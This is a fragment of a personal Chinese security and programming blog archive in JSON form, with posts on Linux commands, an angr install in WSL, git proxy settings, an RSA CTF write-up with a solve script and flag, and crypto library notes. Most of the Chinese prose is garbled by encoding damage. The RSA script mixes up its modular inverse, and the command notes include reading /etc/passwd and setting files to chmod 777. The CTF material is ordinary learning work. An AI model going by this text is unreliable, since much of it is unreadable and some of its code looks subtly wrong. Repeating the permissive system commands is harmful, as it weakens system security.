å¯†ç®—æ³•å’Œä¿æŠ¤æ‰‹æ®µæ‰èƒ½å‘æŒ¥å…¶çœŸæ­£å¨åŠ›ï¼Œå›å¤´çœ‹è‡ªå·±æŠ˜è…¾å‡ºæ¥çš„ä»£ç æ€»è§‰å¾—å¾ˆå¹¼ç¨šã€‚ã€‚ã€‚\nå‚è€ƒèµ„æ–™ï¼š # ã€ŠåŠ å¯†ä¸è§£å¯† ç¬¬å››ç‰ˆã€‹11ç«  https://bbs.pediy.com/thread-201708.htm https://blog.csdn.net/orbit/article/details/1497457\n","date":"9 May 2020","permalink":"/achieve/2019to2021/%E4%B8%80%E6%AC%A1smc%E7%9A%84%E5%AE%9E%E7%8E%B0/","section":"archive","summary":"VC6å®ç°SMCåŠ¨æ€ä»£ç åŠ å¯†æŠ€æœ¯ # è‡ªå·±åšreç»å¸¸ç¢°åˆ°smcï¼ŒæŠ˜è…¾ä¹…äº†ä¹Ÿä¼šæ‰‹ç—’ç—’è‡ªå·±å¼„ä¸€ä¸ªï¼Œç®—æ˜¯å¯¹PEç»“æ„çš„å·©å›ºã€‚ã€‚ã€‚æŠ€æœ¯æœ¬èº«ä¹Ÿä¸å¤ªéš¾æ‡‚ï¼ŒæŠ˜è…¾å®Œå‘ç°ä¹Ÿæ²¡å¼„å‡ºå•¥æœ‰æŠ€æœ¯å«é‡çš„ä¸œè¥¿ï¼Œå°±ç®—ä½œå­¦ä¹ åŠ å¯†æŠ€æœ¯çš„ä¸€ä¸ªå¼€ç«¯å§","title":"ä¸€æ¬¡SMCçš„å®ç°"},{"content":"\rä¸€äº›ï¼ˆæœ€è¿‘ç”¨åˆ°çš„ï¼‰å¸¸ç”¨æŒ‡ä»¤ï¼š # æ²¡äº‹ä¸æƒ³ç”¨vim : (\nls -iè¯¦ç»†ä¿¡æ¯æ˜¾ç¤º [è·¯å¾„(é»˜è®¤å½“å‰ç›®å½•)] -aéšè—æ–‡ä»¶æ˜¾ç¤º -hå¤§å°æŒ‰kbæ˜¾ç¤º A*.txt æœç´¢Aå¼€å¤´.txtç»“å°¾çš„æ–‡ä»¶ #å¯¹æ–‡ä»¶ï¼š mv 1 1.txt #1 æ”¹ä¸º 1.txt #å¯¹æ–‡ä»¶å¤¹ï¼š mv fld fld2#è‹¥fld2å­˜åœ¨åˆ™ç§»åŠ¨fldåˆ°fld2ä¸‹ï¼Œå¦åˆ™æ”¹åä¸ºfld2 whereis xxxxx #æŸ¥æ‰¾æ–‡ä»¶ä½ç½® vim [æ–‡ä»¶å] å‘½ä»¤(ä¸€èˆ¬)æ¨¡å¼ä¸‹ï¼š i #è¿›å…¥ç¼–è¾‘æ¨¡å¼ shift + `ï¼š`#æ‰“å¼€åº•éƒ¨å‘½ä»¤è¡Œ / #æŒ‰ä¸‹åè¾“å…¥å­—ç¬¦ä¸²å¯ä»¥åŒ¹é…å­—ç¬¦ä¸² gg #å›ç¬¬ä¸€è¡Œ shift + x #ç±»ä¼¼windowsçš„backspace dd #è¡Œæ¶ˆé™¤ yy #å¤åˆ¶æœ¬è¡Œ shift + p #ç²˜è´´åœ¨å…‰æ ‡ä¸Šä¸€è¡Œ p #ç²˜è´´åœ¨å…‰æ ‡ä¸‹ä¸€è¡Œ u #ç±»ä¼¼ctrl + z [è¾“å…¥æ•°å­—n] + å›è½¦ #å‘ä¸‹è·³nè¡Œ ctrl f#å¯¹åº”uppage ctrl b#å¯¹åº”downpage #å¤šè¡Œæ³¨é‡Š ctrl + v --\u0026gt; é€‰æ‹©å¤šè¡Œå¹¶shift + i--\u0026gt; è¾“å…¥å­—ç¬¦å›è½¦---\u0026gt;å­—ç¬¦ä¼šå¤åˆ¶åˆ°é€‰æ‹©èµ·æ¥çš„æ‰€æœ‰è¡Œå‰é¢ å¦‚æœè¾“å…¥`#`æˆ–è€…`//`å¯ä»¥è¾¾åˆ°å¤šè¡Œæ³¨é‡Šçš„æ•ˆæœ åº•éƒ¨å‘½ä»¤æ¨¡å¼ï¼š ESCå›åˆ°å‘½ä»¤ï¼ˆä¸€èˆ¬ï¼‰æ¨¡å¼ q é€€å‡º w ä¿å­˜ qï¼å¼ºåˆ¶é€€å‡ºä¸ä¿å­˜ wï¼å¼ºåˆ¶ä¿å­˜ 1,s/A/B/gc #ä»ç¬¬ä¸€è¡Œå¼€å§‹æ‰¾ A å¹¶è¯¢é—®æ˜¯å¦æ¢æˆ B è¯¢é—®é€‰é¡¹ï¼šy yes n next a å…‰æ ‡ä»¥ä¸‹çš„all ï¼ˆå¯èƒ½å¾ˆæœ‰ç”¨ï¼‰ q quit ç¼–è¾‘æ¨¡å¼ï¼š inster #åœ¨æ›¿æ¢å’Œæ’å…¥ä¹‹é—´åˆ‡æ¢ æ·»åŠ ç¯å¢ƒå˜é‡ï¼š export PATH=[path] //ä¸éœ€è¦æ‹¬å·å’Œå¼•å· å¦‚ï¼šexport PATH=$PATH:/mnt/c/Users/16953/bin/ sudo password root//é‡ç½®å¯†ç  sudo -i//åˆ‡æ¢è‡³sudoç”¨æˆ· chmod 777 file//æƒé™æ‹‰æ»¡ chmod 000 file//æƒé™å…¨å…³ abc a:User b:Group c:Other æƒé™é€‰é¡¹ï¼š rï¼šè¯» wï¼šå†™ xï¼šæ‰§è¡Œ ubuntu config --default-user root è®¾ç½®é»˜è®¤ç”¨æˆ·ä»¥ä¸ºroot w who å½“å‰**åœ¨ç™»é™†**ç”¨æˆ· whoami æŸ¥è¯¢å½“å‰ç”¨æˆ· cat /etc/passwd æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·ï¼Œä½†æ˜¯å¾ˆä¸‘ lastlog æ¯”ä¸Šé¢é‚£ä¸ªå¥½çœ‹ä¸€äº› apt-get update // æ›´æ–°å®‰è£…æºï¼ˆSourceï¼‰ apt-get upgrade // æ›´æ–°å·²å®‰è£…çš„è½¯ä»¶åŒ… dist-upgrade //æ›´æ–°ä¾èµ– apt-cache search PackageName // æœç´¢è½¯ä»¶åŒ… ","date":"8 May 2020","permalink":"/achieve/2019to2021/%E4%B8%80%E4%BA%9Blinux%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/","section":"archive","summary":"ä¸€äº›ï¼ˆæœ€è¿‘ç”¨åˆ°çš„ï¼‰å¸¸ç”¨æŒ‡ä»¤ï¼š # æ²¡äº‹ä¸æƒ³ç”¨vim : (","title":"ä¸€äº›linuxå¸¸ç”¨æŒ‡ä»¤"},{"content":"\råœ¨wslä¸Šå®‰è£…angræ¡†æ¶ # æŠ˜è…¾äº†å¥½å‡ å¤©ç»ˆäºæ˜¯æŠŠè¿™å¥—ä¸œè¥¿ç»™æŠ˜è…¾å®Œäº†ï¼Œwindowsä¸ŠæŠ˜è…¾ä¸€å¤©æœ€åè¿˜æ˜¯æ— æ³•è§£å†³æŠ¥é”™ï¼Œå¹²è„†æŒ‰åœ¨äº†wslä¸Šã€‚å°±æŠŠä»å¤´åˆ°å°¾è¸©è¿‡çš„å‘å…¨éƒ¨æ‹¿å‡ºæ¥å†™ä¸€ä¸‹å¥½äº†\nå…ˆæ£€æŸ¥æ–°è£…å¥½çš„ wsl æœ‰æ²¡æœ‰å®‰è£… pip ï¼Œæ²¡æœ‰çš„è¯ç³»ç»Ÿä¼šæç¤ºç”¨aptå®‰è£…ã€‚\nå®‰è£… virtualenvï¼š # pip3 install virtualenv åœ¨pythonå¼€å‘ä¸­ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šé‡åˆ°ä¸€ç§æƒ…å†µï¼Œå°±æ˜¯å½“å‰çš„é¡¹ç›®ä¾èµ–çš„æ˜¯æŸä¸€ä¸ªç‰ˆæœ¬ï¼Œä½†æ˜¯å¦ä¸€ä¸ªé¡¹ç›®ä¾èµ–çš„æ˜¯å¦ä¸€ä¸ªç‰ˆæœ¬ï¼Œè¿™æ ·å°±ä¼šé€ æˆä¾èµ–å†²çªï¼Œè€Œvirtualenvå°±æ˜¯è§£å†³è¿™ç§æƒ…å†µçš„ï¼Œvirtualenvé€šè¿‡åˆ›å»ºä¸€ä¸ªè™šæ‹ŸåŒ–çš„pythonè¿è¡Œç¯å¢ƒï¼Œå°†æˆ‘ä»¬æ‰€éœ€çš„ä¾èµ–å®‰è£…è¿›å»çš„ï¼Œä¸åŒé¡¹ç›®ä¹‹é—´ç›¸äº’ä¸å¹²æ‰°ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚\næ„æ€å°±æ˜¯è¯´angrä¼šå½±å“pythonçš„ç¯å¢ƒæ‰€ä»¥è¦æ–°å»ºä¸€ä¸ªç‹¬ç«‹çš„pythonç¯å¢ƒï¼ˆå…·ä½“æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼‰\nå…ˆæ–°å»ºåˆ°ä¸€ä¸ªangrä¸“ç”¨æ–‡ä»¶å¤¹ï¼š\nljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953$ mkdir angr_enviroment ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953$ cd angr_enviroment/ æ–°å»ºä¸€ä¸ª python ç‹¬ç«‹è¿è¡Œç¯å¢ƒï¼š # virtualenv -p pythonä½ç½® myenv pythonä½ç½®è¿™æ ·è·å¾—ï¼š\nljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953$ whereis python python: /usr/bin/python3.6 /usr/bin/python3.6-config /usr/bin/python3.6m /usr/bin/python3.6m-config /usr/lib/python2.7 /usr/lib/python3.6 /usr/lib/python3.7 /usr/lib/python3.8 /etc/python3.6 /usr/local/lib/python3.6 /usr/include/python3.6 /usr/include/python3.6m /usr/share/python /mnt/c/Program Files (x86)/NetSarang/Xshell 6/python34.dll /mnt/c/Program Files (x86)/NetSarang/Xshell 6/python34.zip /mnt/c/py374/python.pdb /mnt/c/py374/python3.dll /mnt/c/py374/python3.exe /mnt/c/py374/python37.dll /mnt/c/py374/python37.pdb /mnt/c/Windows/system32/python27.dll /mnt/c/p27/python2.exe /mnt/c/Users/16953/AppData/Local/Microsoft/WindowsApps/python.exe /mnt/c/Users/16953/AppData/Local/Microsoft/WindowsApps/python3.exe ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953$ å¤åˆ¶ç²˜è´´ç¬¬ä¸€ä¸ª/usr/bin/python3.6\nå…·ä½“ä½ç½®å¯èƒ½ä¼šæœ‰å·®å¼‚\nè¿è¡Œï¼šljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ virtualenv -p /usr/bin/python3.6 myenv\nåº”è¯¥å¯ä»¥ç”¨windowsèµ„æºç®¡ç†å™¨åœ¨angr_enviromentæ–‡ä»¶å¤¹ä¸‹çœ‹çš„ä¸€ä¸ªæ–°å»ºçš„myenvæ–‡ä»¶å¤¹ï¼Œ\nå®‰è£…angrï¼š # #å¯åŠ¨ç¯å¢ƒ ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ source myenv/bin/activate #å®‰è£…angr (myenv) ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ pip3 install angr ã€‚ ã€‚ å®‰ è£… ä¸­ ã€‚ ã€‚ (myenv) ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ python3 Python 3.6.9 (default, Apr 18 2020, 01:56:04) [GCC 8.4.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import angr \u0026gt;\u0026gt;\u0026gt; #æœªæŠ¥é”™åˆ™æˆåŠŸ #å…³é—­ç¯å¢ƒ (myenv) ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ deactivate ljahum@LAPTOP-3PRLLIJT:/mnt/c/Users/16953/bin/wslhome/angr_enviroment$ ä¹‹åè¦ä½¿ç”¨angrçš„æ—¶å€™ä¹Ÿè¦å¼€å¯ç¯å¢ƒæ‰€ä»¥å°½é‡è£…åœ¨wslåˆå§‹åŒ–ç•Œé¢é™„è¿‘\nå¯¹pythonè™šæ‹Ÿç¯å¢ƒçš„ä¸€ç‚¹ç‚¹è§£é‡Šï¼šï¼ˆæ„Ÿè§‰å…¶å®å°±æ˜¯å¤‡ä»½äº†ä¸€ä¸ªæ‹¿æ¥ç»™ç‰¹å®šåº”ç”¨æŠ˜è…¾ï¼‰\né’ˆå¯¹æ¯ä¸ªåº”ç”¨åˆ›å»ºç‹¬ç«‹è¿è¡Œçš„pythonç¯å¢ƒï¼Œè¿™æ ·å°±å¯ä»¥å¯¹æ¯ä¸ªåº”ç”¨çš„pyhtonç¯å¢ƒè¿›è¡Œéš”ç¦»ã€‚åŸç†å°±æ˜¯æŠŠç³»ç»Ÿpythonå¤åˆ¶ä¸€ä»½åˆ°virtualenvçš„ç¯å¢ƒï¼Œç”¨å‘½ä»¤source venv/bin/activateè¿›å…¥ä¸€ä¸ªvirtualenvç¯å¢ƒçš„æ—¶å€™ï¼Œvirtualenvä¼šä¿®æ”¹ç›¸å…³çš„ç¯å¢ƒå˜é‡ï¼Œè®©å‘½ä»¤pythonå’Œpipå‡æŒ‡å‘å½“å‰çš„virtualenvç¯å¢ƒã€‚è¿™ä¸ªæ—¶å€™å‘½ä»¤æç¤ºç¬¦å·å°±å˜äº†ï¼Œå‰é¢æœ‰ä¸€ä¸ªï¼ˆvenv)å‰ç¼€ :3\n","date":"8 May 2020","permalink":"/achieve/2019to2021/wsl%E5%AE%89%E8%A3%85angr/","section":"archive","summary":"åœ¨wslä¸Šå®‰è£…angræ¡†æ¶ # æŠ˜è…¾äº†å¥½å‡ å¤©ç»ˆäºæ˜¯æŠŠè¿™å¥—ä¸œè¥¿ç»™æŠ˜è…¾å®Œäº†ï¼Œwindowsä¸ŠæŠ˜è…¾ä¸€å¤©æœ€åè¿˜æ˜¯æ— æ³•è§£å†³æŠ¥é”™ï¼Œå¹²è„†æŒ‰åœ¨äº†wslä¸Šã€‚å°±æŠŠä»å¤´åˆ°å°¾è¸©è¿‡çš„å‘å…¨éƒ¨æ‹¿å‡ºæ¥å†™ä¸€ä¸‹å¥½äº†","title":"wslå®‰è£…angr"},{"content":"\rè¢«ä¸€ä¸ªå¾ˆå‘çˆ¹çš„é—®é¢˜æŠ˜è…¾äº†ä¸€å¤©-è§£å†³gitä¸‹è½½é€Ÿåº¦è¿‡æ…¢ # ç¢°åˆ°çš„é—®é¢˜éƒ½æ˜¯æ¯”è¾ƒä¸ªä¾‹çš„ï¼Œæ‰€ä»¥æ‰ä¼šæ”¾åœ¨åšå®¢\nå‡ ç§å¸¸è§çš„è§£å†³æ–¹æ¡ˆï¼š # 1. æ›´æ”¹hostsæ–‡ä»¶ï¼š # è¿›å…¥è¿™ä¸ªç½‘ç«™\ræŸ¥è¯¢ä»¥ä¸‹ç½‘å€çš„ ip\ngithub.com github.global.ssl.fastly.net codeload.github.com ç”¨cmdæŒ‡ä»¤ ping ä¸€ä¸‹ip\nping xxx.xxx.xxx.xxx å¦‚æœpingå¾—é€šå°±æŒ‰ä»¥ä¸‹æ ¼å¼æ·»åŠ åˆ°hostsæ–‡ä»¶ä¸­\nhostsæ–‡ä»¶ä½ç½®ï¼šC:\\Windows\\System32\\drivers\\etc\nåƒè¿™æ ·ï¼š\n# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a \u0026#39;#\u0026#39; symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a \u0026#39;#\u0026#39; symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 140.82.114.4 github.com 199.232.69.194 github.global.ssl.fastly.net 140.82.112.9 codeload.github.com #ä»¥ä¸‹ç½‘å€å¯æœ‰å¯æ—  185.199.108.153 assets-cdn.github.com 199.232.68.133 raw.githubusercontent.com 199.232.68.133 cloud.githubusercontent.com 199.232.68.133 camo.githubusercontent.com 199.232.68.133 avatars0.githubusercontent.com 199.232.68.133 avatars1.githubusercontent.com 199.232.68.133 avatars2.githubusercontent.com 199.232.68.133 avatars3.githubusercontent.com 199.232.68.133 avatars4.githubusercontent.com 199.232.68.133 avatars5.githubusercontent.com 199.232.68.133 avatars6.githubusercontent.com 199.232.68.133 avatars7.githubusercontent.com 199.232.68.133 avatars8.githubusercontent.com æ‰§è¡Œipconfig /flushdnså‘½ä»¤ï¼Œåˆ·æ–° DNS ç¼“å­˜\n2. ä¿®æ”¹ä»£ç†ï¼ˆè¾ƒä¸ºæœ‰æ•ˆï¼‰ï¼š # é¦–å…ˆæŸ¥çœ‹gitconfigæ–‡ä»¶æ˜¯å¦å·²ç»æœ‰å…¶ä»–ä»£ç†ï¼š\nä½ç½®ï¼šC:\\Users\\xxxxx\\.gitconfig\n[user] email = 1695325350@qq.com name = ljahum #æŠŠè¿™è¡Œå­—ä»¥ä¸‹çš„è®¾ç½®å…¨éƒ¨æ³¨é‡Šæ‰ #[http \u0026#34;https://github.com\u0026#34;] # proxy = https://127.0.0.1:1086 #[https \u0026#34;https://github.com\u0026#34;] # proxy = https://127.0.0.1:10863 #[http \u0026#34;http://github.com\u0026#34;] # proxy = http://127.0.0.1:10808 #[http \u0026#34;https://github.com\u0026#34;] # proxy = http://127.0.0.1:10808 [http] proxy = socks5://127.0.0.1:4781 [https] proxy = socks5://127.0.0.1:4781 åŠ¨åŠ¨å°æ‰‹æ‰“å¼€ vpn æŸ¥çœ‹ http(s) ç«¯å£å’Œ socks ç«¯å£çš„å€¼\næ³¨æ„å¦‚æœç§Ÿçš„æ¢¯å­ä¸€å®šè¦åˆ°å–å®¶å“ªé‡Œæ›´æ–°å®¢æˆ·ç«¯å†æŸ¥çœ‹\næŒ‰ä»¥ä¸‹æ ¼å¼å†™å…¥ .gitconfig ä¸­ï¼š\n[http] proxy = socks5://127.0.0.1:[socks ç«¯å£çš„å€¼] [https] proxy = socks5://127.0.0.1:[socks ç«¯å£çš„å€¼] ä¹Ÿå¯ä»¥æ”¹æˆhttpï¼ˆsï¼‰çš„é‚£ç§ï¼Œæœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š\n[user] #ç”¨æˆ·åä¸é‚®ç®±ï¼Œä¸ç”¨ç®¡ email = 1695325350@qq.com name = ljahum #socks5: [http] proxy = socks5://127.0.0.1:4781 [https] proxy = socks5://127.0.0.1:4781 #http(s): [http] proxy = 127.0.0.1:4780 [https] proxy = 127.0.0.1:4780 3. æŠŠæ‰€éœ€çš„åº“æ¬åˆ°giteeä¸Š # æ•™ç¨‹å¾ˆå¤šå°±ä¸å†™äº†,ç½‘ä¸Šåˆ°å¤„éƒ½æ˜¯ï¼Œç¼ºç‚¹æ˜¯æœ‰äº›ä¸œè¥¿åœ¨å®‰è£…çš„æ—¶å€™ä¼šè®¿é—®githubçš„åº“ã€‚\nä½œä¸ºä¸ªäººæˆ–è€…å›¢é˜Ÿä¹‹é—´çš„ä»“åº“å¿«çš„é£èµ·ã€‚\n","date":"7 May 2020","permalink":"/achieve/2019to2021/git%E4%BB%A3%E7%90%86%E9%97%AE%E9%A2%98/","section":"archive","summary":"è¢«ä¸€ä¸ªå¾ˆå‘çˆ¹çš„é—®é¢˜æŠ˜è…¾äº†ä¸€å¤©-è§£å†³gitä¸‹è½½é€Ÿåº¦è¿‡æ…¢ # ç¢°åˆ°çš„é—®é¢˜éƒ½æ˜¯æ¯”è¾ƒä¸ªä¾‹çš„ï¼Œæ‰€ä»¥æ‰ä¼šæ”¾åœ¨åšå®¢","title":"Gitä»£ç†é—®é¢˜"},{"content":"\ré¢˜ç›®ï¼š # p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 å·²çŸ¥ dqï¼Œdpï¼Œqï¼Œpï¼Œcï¼Œæ±‚ m ï¼Œä¸€ä¸ªä¸­å›½å‰©ä½™å®šç†æ‰©å±•çš„é¢˜ï¼ŒåŸç†å’±ä¹Ÿä¸å¤ªæ‡‚ï¼Œç”¨å°±å®Œäº‹äº†\nè¯æ˜è¿‡ç¨‹ï¼š # å·²çŸ¥ï¼š d = dp mod (p-1) d = dq mod (q-1) ä»¤ï¼š m1 = cd mod p m2 = cd mod q æœ‰ï¼šcd = kp + m1 æ•…ï¼šm2 = ( kp + m1 ï¼‰mod q \u0026ndash;\u0026gt; m2 - m1 = k*p mod q\nå– p é€†æ¨¡ ï¼š ( m2 - m1 ) * p-1 = k mod q\nk = ( m2 - m1 ) * p-1 mod q \u0026mdash;-\u0026gt; k = ( k1 * q + [ ( m2 - m1 ) * p-1 mod q ] ) cd = k*p + m1 cd = ( k1 * q + [ ( m2 - m1 ) * p-1 mod q ] ) * p + m1 cd = k1 * q *p + [ ( m2 - m1 ) * p-1 mod q ] * p + m1\nm = cd mod n = { k1 * q p + [ ( m2 - m1 ) * p-1 mod q ] * p + m1 } mod n (n = pq)\næ•…ï¼šm = { [ ( m2 - m1 ) * p-1 mod q ] * p + m1 } mod n â€”â€” â‘ \nd = k*( p-1 ) + dp\næ•…ï¼šcd = ck*( p-1 ) + dp\nm1 = cd mod p = ck*( p-1 ) + dp mod p\nç”±äº è´¹é©¬å°å®šç† :\nm1 = c dp mod p\nåŒç† ï¼šm2 = c dq mod q\nexpï¼š # import libnum import Crypto.Util.number p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 invq=libnum.invmod(p,q) mp=pow(c,dp,p) mq=pow(c,dq,q) m=((mp-mq)*invq%p)*q+mq print(libnum.n2s(m)) #noxCTF{W31c0m3_70_Ch1n470wn} è¯æ˜è¿‡ç¨‹ç”¨äº†æ¨¡è¿ç®—çš„ä¸€äº›ç‰¹æ€§ï¼ŒæŒæ¡æ¨¡è¿ç®—æ€§è´¨çš„è¯è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚ã€‚ã€‚ã€‚\n","date":"8 April 2020","permalink":"/achieve/2019to2021/buuctf-rsa1/","section":"archive","summary":"é¢˜ç›®ï¼š # p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 å·²çŸ¥ dqï¼Œdpï¼Œqï¼Œpï¼Œcï¼Œæ±‚ m ï¼Œä¸€ä¸ªä¸­å›½å‰©ä½™å®šç†æ‰©å±•çš„é¢˜ï¼ŒåŸç†å’±ä¹Ÿä¸å¤ªæ‡‚ï¼Œç”¨å°±å®Œäº‹äº†","title":"buuctf-rsa1"},{"content":"\rSymPyä¸­æ•°è®ºéƒ¨åˆ†ä½¿ç”¨è¯´æ˜ # sympyæ˜¯ä¸€ä¸ªPythonçš„ç§‘å­¦è®¡ç®—åº“ï¼Œç”¨ä¸€å¥—å¼ºå¤§çš„ç¬¦å·è®¡ç®—ä½“ç³»å®Œæˆè¯¸å¦‚å¤šé¡¹å¼æ±‚å€¼ã€æ±‚æé™ã€è§£æ–¹ç¨‹ã€æ±‚ç§¯åˆ†ã€å¾®åˆ†æ–¹ç¨‹ã€çº§æ•°å±•å¼€ã€çŸ©é˜µè¿ç®—ç­‰ç­‰è®¡ç®—é—®é¢˜ :D\nsympy.factorint\nlist(sympy.sieve.primerange(æ•°å­—1,æ•°å­—2))åˆ—å‡ºå¤§äºç­‰äºæ•°å­—1ï¼Œå°äºæ•°å­—2çš„æ‰€æœ‰ç´ æ•°\nsympy.prime(n)è¿”å›ç¬¬nä¸ªç´ æ•°\nsympy.isprime(n)ç´ æ€§æ£€æµ‹\nsympy.primepi(n)è¿”å›å°äºnçš„ç´ æ•°çš„æ€»æ•°\nsympy.nextprime(89)è¿”å›ä¸‹ä¸€ä¸ªç´ æ•°ï¼Œè¿™é‡Œç»“æœæ˜¯97\nsympy.prevprime(96)æˆ–sympy.prevprime(97)è¿”å›ä¸Šä¸€ä¸ªç´ æ•°ï¼Œç»“æœéƒ½æ˜¯89\nsympy.randprime(1,30)è¿”å›1åˆ°30ä¹‹é—´çš„ä¸€ä¸ªå¤§äºç­‰äº1å°äº30çš„éšæœºç´ æ•° range [a, b)\nsympy.primorial \u0026gt;\u0026gt;\u0026gt; primorial(4) # the first 4 primes are 2, 3, 5, 7 210 \u0026gt;\u0026gt;\u0026gt; primorial(4, nth=False) # primes \u0026lt;= 4 are 2 and 3 6 libnumåº“ # å¤§ä½“åŠŸèƒ½å’Œ sympy æ¯”è¾ƒç›¸ä¼¼ï¼Œpython3.7+çš„å°ä¼™ä¼´å¯ä»¥ç”¨è¿™ä¸ª\nhas_invmod (eï¼Œn)æ£€æµ‹æ˜¯å¦æœ‰é€†æ¨¡\nd = invmod (e, n) æ±‚é€†æ¨¡ï¼Œæ»¡è¶³å…³ç³» d * e = 1 mod n (gmpy2.invert)\ngcd(a, b) æ±‚ä¸¤æ•°æœ€å¤§å…¬çº¦æ•°(æ¬§å‡ é‡Œå¾—ç®—æ³•)\nxgcd(a, b) æ‰©å±•æ¬§å‡ é‡Œå¾— è¿”å›ï¼ˆxï¼Œyï¼Œgï¼‰ï¼ša * x + b * y = gcdï¼ˆaï¼Œbï¼‰= g\næ€»ä¹‹åŠŸèƒ½å°±æ˜¯éå¸¸å¤šå•¦ã€‚ã€‚ã€‚https://github.com/JafarAkhondali/python3-libnum\nCrypto.Util.number # C y p t o , æ°¸ è¿œ æ»´ ç¥ ~~~\nl = bytes_to_long(b)\nb = long_to_bytes(l) è¿™ä¸¤ä¸ªä¸ç”¨è¯´å¥½ç”¨åˆ°çˆ†\ngetPrime(n) è¿”å›ä¸€ä¸ªéšæœºçš„Nä½bitçš„ç´ æ•°\nd = inverse(e, n) åŒæ ·æ±‚é€†æ¨¡\nhttps://www.pycryptodome.org/en/latest/src/introduction.html\n","date":"30 March 2020","permalink":"/achieve/2019to2021/pycypto/","section":"archive","summary":"SymPyä¸­æ•°è®ºéƒ¨åˆ†ä½¿ç”¨è¯´æ˜ # sympyæ˜¯ä¸€ä¸ªPythonçš„ç§‘å­¦è®¡ç®—åº“ï¼Œç”¨ä¸€å¥—å¼ºå¤§çš„ç¬¦å·è®¡ç®—ä½“ç³»å®Œæˆè¯¸å¦‚å¤šé¡¹å¼æ±‚å€¼ã€æ±‚æé™ã€è§£æ–¹ç¨‹ã€æ±‚ç§¯åˆ†ã€å¾®åˆ†æ–¹ç¨‹ã€çº§æ•°å±•å¼€ã€çŸ©é˜µè¿ç®—ç­‰ç­‰è®¡ç®—é—®é¢˜ :D","title":"pythonå¯†ç å­¦å¸¸ç”¨åº“"},{"content":" è‡ªå·±åšå®¢å°±æ‡’å¾—æ”¾wpè¿™ç§ä¸œè¥¿äº†,å†™ä¸€ç‚¹æ€»ç»“æ€§çš„ä¸œè¥¿ï¼Œè¿‡å‡ å¤©å§å¯†ç å­¦å­¦ä¹ æˆæœpoå‡ºæ¥å¥½äº† ä½ æ˜¯æ‡’å¾—piçˆ†\nRC4çš„å¥‡æ·«æŠ€å·§ï¼š # ä¸»æœ‰è¿˜æ˜¯ç”¨äº†a ^ b ^ a = bçš„æŠ€å·§\nmessage ^ rc4_table = cypher cypher ^ message = rc4_table å†…å­˜ã€hexç•Œé¢ã€å¯„å­˜å™¨ 